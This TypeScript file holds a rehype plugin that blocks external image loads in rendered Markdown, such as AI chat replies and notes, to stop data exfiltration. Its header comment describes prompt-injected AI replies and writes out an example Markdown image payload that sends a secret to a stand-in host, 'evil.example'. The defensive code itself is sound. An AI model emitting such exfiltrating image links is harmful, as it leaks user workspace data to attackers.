/**
 * Which images rendered Markdown (AI chat replies, note blocks) may load.
 *
 * An image URL is a request the browser makes on its own, so Markdown that
 * an attacker can influence (a prompt-injected AI reply, an imported note)
 * could otherwise smuggle workspace data out in a query string:
 * `![](https://evil.example/x.png?d=<secret>)`. Rendered Markdown may
 * therefore only show:
 * - the app's own uploaded assets, `/api/asset/<id>` (an absolute URL to that
 *   route on any host, e.g. from a Markdown export of another deployment, is
 *   rewritten to the relative path, so it always loads from this origin);
 * - other same-origin paths (`/icons/...`);
 * - inline `data:image/...` URIs (they make no request).
 * Anything else is dropped and only its alt text is shown. The app's
 * Content-Security-Policy (`img-src` in next.config.ts) is the second wall.
 *
 * Pure and deterministic (no window/origin lookups), so server and client
 * renders agree.
 */

const ASSET_PATH = /^\/api\/asset\/[A-Za-z0-9_-]{1,128}$/;
const DATA_IMAGE = /^data:image\/[a-z0-9.+-]+[;,]/i;

/**
 * The URL to load for a Markdown image `src`, or null when it must not load.
 */
export function safeImageSrc(raw: unknown): string | null {
  if (typeof raw !== "string") return null;
  const src = raw.trim();
  if (!src) return null;
  if (DATA_IMAGE.test(src)) return src;
  // Same-origin path. "//host" and "/\host" are protocol-relative to another host.
  if (src.startsWith("/") && !src.startsWith("//") && !src.startsWith("/\\")) {
    return src;
  }
  // An absolute link to an asset route: load our own copy instead.
  try {
    const url = new URL(src);
    if ((url.protocol === "https:" || url.protocol === "http:") && ASSET_PATH.test(url.pathname)) {
      return url.pathname;
    }
  } catch {
    // Relative paths without a leading slash and junk fall through to "blocked".
  }
  return null;
}

// Minimal hast shapes (the hast types are not a direct dependency).
interface HastNode {
  type: string;
  tagName?: string;
  value?: string;
  properties?: Record<string, unknown>;
  children?: HastNode[];
}

/** Properties through which an element can make the browser fetch an image. */
const FETCHING_PROPS = ["srcSet", "poster", "background"] as const;

function restrict(node: HastNode): void {
  const children = node.children;
  if (!children) return;
  for (let i = 0; i < children.length; i += 1) {
    const child = children[i];
    if (child.type !== "element") continue;
    const props = child.properties ?? {};
    for (const key of FETCHING_PROPS) delete props[key];
    if (child.tagName === "img") {
      const safe = safeImageSrc(props.src);
      if (safe) {
        props.src = safe;
      } else {
        // Keep the alt text so the reader still sees what the image was.
        const alt = typeof props.alt === "string" ? props.alt : "";
        children[i] = { type: "text", value: alt };
      }
      continue;
    }
    if (child.tagName === "source") {
      // <picture><source srcset> would load without our check; drop it.
      children.splice(i, 1);
      i -= 1;
      continue;
    }
    if ("src" in props) {
      const safe = safeImageSrc(props.src);
      if (safe) props.src = safe;
      else delete props.src;
    }
    restrict(child);
  }
}

/** Rehype plugin: apply `safeImageSrc` to every image in the tree. */
export function rehypeRestrictImages() {
  return (tree: HastNode) => {
    restrict(tree);
  };
}
